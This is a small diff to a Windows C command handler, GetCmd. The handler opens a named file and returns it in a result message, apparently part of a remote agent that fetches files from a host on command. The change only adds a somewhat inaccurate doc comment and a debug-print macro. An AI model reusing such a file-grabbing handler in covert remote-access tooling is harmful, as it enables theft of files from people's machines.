@@ -2,7 +2,13 @@
 #include "message.h"
 #include "debug.h"
 #include <windows.h>
-// TODO: Add logic to check for command failure vs fatal failure (memory)
+
+/*
+@brief Function that gets a file
+@param PMESSAGE containts the parameters for the command
+@param PMESSAGE is a pointer to the result that will be sent back
+@return ERROR_T with status of dir
+*/
 ERROR_T GetCmd(PMESSAGE pMsg, PMESSAGE *pResult) {
     INT iError = E_SUCCESS;
     PDWORD pRemoteFileNameLen = NULL;
@@ -25,7 +31,7 @@ ERROR_T GetCmd(PMESSAGE pMsg, PMESSAGE *pResult) {
 
     hFile = CreateFileA(pRemoteFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (INVALID_HANDLE_VALUE == hFile) {
-        printf("%d\n", GetLastError());
+        DBG_PRINT("%d\n", GetLastError());
         iError = E_GET_ERROR;
         goto end;
     }
